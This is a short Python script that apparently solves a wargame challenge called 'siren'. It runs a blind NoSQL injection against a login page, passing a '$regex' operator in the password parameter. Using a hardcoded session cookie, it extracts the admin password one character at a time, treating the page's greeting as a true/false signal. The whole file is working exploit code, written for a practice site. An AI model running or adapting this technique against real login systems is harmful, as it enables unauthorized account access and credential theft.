import requests
import time
import string

url = "https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php"
cookies = dict(PHPSESSID="33a17d5ikllqctdau572ms56ui")

pw = ''
for i in range(1,9):
    for j in string.ascii_lowercase+string.ascii_uppercase+string.digits:
        payload = f"?id=admin&pw[$regex]=^{pw+j}"

        response = requests.get(url+payload, cookies=cookies)
        if "<br><h2>Hello" in response.text:
            pw += j
            print(j)
            break
print(pw)